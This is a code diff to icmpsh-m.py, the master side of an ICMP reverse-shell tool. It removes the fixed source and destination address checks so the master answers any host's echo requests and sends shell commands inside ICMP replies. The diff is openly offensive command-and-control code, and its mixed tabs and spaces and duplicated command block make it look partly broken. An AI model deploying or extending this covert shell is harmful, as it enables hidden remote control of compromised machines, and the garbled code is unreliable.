@@ -36,7 +36,7 @@ def setNonBlocking(fd):
     flags = flags | os.O_NONBLOCK
     fcntl.fcntl(fd, fcntl.F_SETFL, flags)
 
-def main(src, dst):
+def main():
     if subprocess.mswindows:
         sys.stderr.write('icmpsh master can only run on Posix systems\n')
         sys.exit(255)
@@ -66,8 +66,8 @@ def main(src, dst):
 
     # Create a new IP packet and set its source and destination addresses
     ip = ImpactPacket.IP()
-    ip.set_ip_src(src)
-    ip.set_ip_dst(dst)
+    #ip.set_ip_src(src)
+    #ip.set_ip_dst(dst)
 
     # Create a new ICMP packet of type ECHO REPLY
     icmp = ImpactPacket.ICMP()
@@ -94,9 +94,16 @@ def main(src, dst):
             icmppacket = ippacket.child()
 
             # If the packet matches, report it to the user
-            if ippacket.get_ip_dst() == src and ippacket.get_ip_src() == dst and 8 == icmppacket.get_icmp_type():
+            if 8 == icmppacket.get_icmp_type():
                 # Get identifier and sequence number
-                ident = icmppacket.get_icmp_id()
+                ip = ippacket
+		dst =  ippacket.get_ip_src()
+    		src =  ippacket.get_ip_dst()
+  		ip.set_ip_src(src)
+                ip.set_ip_dst(dst)
+
+
+		ident = icmppacket.get_icmp_id()
                 seq_id = icmppacket.get_icmp_seq()
                 data = icmppacket.get_data_as_string()
 
@@ -120,6 +127,18 @@ def main(src, dst):
                 icmp.set_icmp_cksum(0)
                 icmp.auto_checksum = 1
                 icmp.set_icmp_timeout = 0
+                
+	        # Include the command as data inside the ICMP packet
+		reply = 'abcdefghi'
+                # Send it to the target host
+		if (data.find(reply) == -1):
+		   icmp.contains(ImpactPacket.Data(cmd))
+		else:
+		   icmp.contains(ImpactPacket.Data(data))
+
+                 # Have the IP packet contain the ICMP packet (along with its payload)
+                ip.contains(icmp)
+
 
 	        # Include the command as data inside the ICMP packet
 		reply = 'abcdefghi'
@@ -135,10 +154,10 @@ def main(src, dst):
 		sock.sendto(ip.get_packet(), (dst, 0))
 
 if __name__ == '__main__':
-    if len(sys.argv) < 3:
-        msg = 'missing mandatory options. Execute as root:\n'
-        msg += './icmpsh-m.py <source IP address> <destination IP address>\n'
-        sys.stderr.write(msg)
-        sys.exit(1)
+#    if len(sys.argv) < 3:
+#        msg = 'missing mandatory options. Execute as root:\n'
+#        msg += './icmpsh-m.py <source IP address> <destination IP address>\n'
+#        sys.stderr.write(msg)
+#        sys.exit(1)
 
-    main(sys.argv[1], sys.argv[2])
+    main()
